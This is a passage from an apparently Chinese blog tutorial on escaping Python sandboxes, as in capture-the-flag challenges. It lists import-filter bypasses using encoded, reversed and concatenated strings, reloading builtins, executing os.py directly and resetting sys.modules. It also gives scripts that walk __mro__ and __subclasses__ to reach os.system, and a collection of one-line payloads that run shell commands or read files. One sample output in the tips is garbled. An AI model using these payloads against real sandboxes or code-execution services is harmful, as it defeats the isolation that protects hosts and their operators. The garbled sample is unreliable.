&apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;\n]\n\nall_modules_3 = [\n    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;\n]\n\nmethods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]\n\nresults = {}\nfor module in all_modules_3:\n    results[module] = {\n        &apos;flag&apos;: 0,\n        &apos;result&apos;: {}\n    }\n\n    try:\n        m = __import__(module)\n        attrs = dir(m)\n        for method in methods:\n            if method in attrs:\n                result = &apos;yes&apos;\n                results[module][&apos;flag&apos;] = 1\n            else:\n                result = &apos;no&apos;\n\n            results[module][&apos;result&apos;][method] = result\n\n    except Exception as e:\n        print(e)\n\nfor result in results:\n    if results[result][&apos;flag&apos;]:\n        print(&apos;[+]&apos; + result)\n        for r in results[result][&apos;result&apos;]:\n            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p>\n<h3 id=\"如果我们没办法-import-呢？\"><a href=\"#如果我们没办法-import-呢？\" class=\"headerlink\" title=\"如果我们没办法 import 呢？\"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p>\n<p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p>\n<p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p>\n<p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>\n<p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p>\n<p>reload 也是内建函数，如果这也没了呢？ </p>\n<pre><code>import imp\nimp.reload(__builtin__)</code></pre><p>也可以引入。</p>\n<p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p>\n<p>实际上联系到 import 的原理</p>\n<blockquote>\n<p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>\n</blockquote>\n<p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p>\n<pre><code>import sys\nprint(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p>\n<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)\nsystem(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p>\n<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:\n    exec(f.read())\nsystem(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p>\n<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的\n\ndel sys.modules[&apos;os&apos;]\nimport os\nos.system(&apos;ls&apos;)</code></pre><h3 id=\"其他一些小技巧\"><a href=\"#其他一些小技巧\" class=\"headerlink\" title=\"其他一些小技巧\"></a>其他一些小技巧</h3><ol>\n<li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p>\n<p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p>\n</li>\n<li><p>函数后面加空格、换行都能执行</p>\n</li>\n<li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p>\n<p> from numpy.distutils.exec_command import _exec_command as system</p>\n<p> system(“ls /“)</p>\n</li>\n<li><p>使用别名</p>\n<p> import os as o</p>\n</li>\n<li><p>字符串拼接</p>\n<p> “l”+”s”</p>\n<p> “func_global”+”s”</p>\n</li>\n<li><p>字符串编码或者其他操作</p>\n<p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p>\n<p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p>\n<p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p>\n<p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p>\n</li>\n</ol>\n<h2 id=\"通过继承关系逃逸\"><a href=\"#通过继承关系逃逸\" class=\"headerlink\" title=\"通过继承关系逃逸\"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p>\n<p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__\n&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__\n&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()\n[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in [].__class__.__base__.__subclasses__():\n    try:\n        if &apos;os&apos; in item.__init__.__globals__:\n            print cnt,item\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():\n    try:\n        cnt2=0\n        for i in item.__init__.__globals__:\n            if &apos;eval&apos; in item.__init__.__globals__[i]:\n                print cnt,item,cnt2,i\n            cnt2+=1\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>这个相当于更深入一层查找</p>\n<p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p>\n<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p>\n<pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; warnings.os\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nAttributeError: &apos;module&apos; object has no attribute &apos;os&apos;\n&gt;&gt;&gt; warnings.linecache\n&lt;module &apos;linecache&apos; from &apos;F:\\python2.7\\lib\\linecache.pyc&apos;&gt;\n&gt;&gt;&gt; warnings.linecache.os\n&lt;module &apos;os&apos; from &apos;F:\\python2.7\\lib\\os.pyc&apos;&gt;</code></pre><p>我们可以</p>\n<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p>\n<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p>\n<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id=\"大佬们的payload\"><a href=\"#大佬们的payload\" class=\"headerlink\" title=\"大佬们的payload\"></a>大佬们的payload</h3><ol>\n<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>\n<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>\n</ol>\n<h3 id=\"过滤中括号\"><a href=\"#过滤中括号\" class=\"headerlink\" 